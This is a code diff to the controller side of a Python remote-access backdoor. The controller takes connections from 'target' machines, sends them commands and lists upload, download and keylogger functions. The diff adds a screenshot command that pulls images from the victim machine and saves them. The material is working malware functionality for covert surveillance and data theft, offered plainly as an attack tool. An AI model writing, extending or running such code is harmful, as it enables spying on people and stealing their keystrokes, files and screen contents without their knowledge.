@@ -46,6 +46,7 @@ try:
     target, ip = sock.accept()
     print(termcolor.colored(f"(!) TARGET CONNECTED FROM {ip} (!)", 'green'))
     def target_communication():
+        count = 0
         while True:
             command = input(f"(machine: {ip} >")
             reliable_send(command)
@@ -60,6 +61,7 @@ try:
   quit ~ quit section
   upload *file name* ~ upload file to target machine
   download *file name* ~ download file from target machine
+  screenshot ~ scrennshot of taget machines
   keylogger -s ~ start keylogger
   keylloger -p ~ print inputed keys
   keylogger -stop ~ stop keylogger
@@ -73,6 +75,20 @@ try:
 
             elif command[:8] == "download":
                 download_file(command[9:])
+
+            elif command[:10] == "screenshot":
+                f = open('scrennshot%d.png' % (count), 'wb')
+                target.settimeout(3)
+                chunk = target.recv(1024)
+                while chunk:
+                    f.write(chunk)
+                    try:
+                        chunk = target.recv(1024)
+                    except socket.timeout as e:
+                        break
+                target.settimeout(None)
+                f.close()  
+                count += 1      
 
             else:
                 result = reliable_rcv()
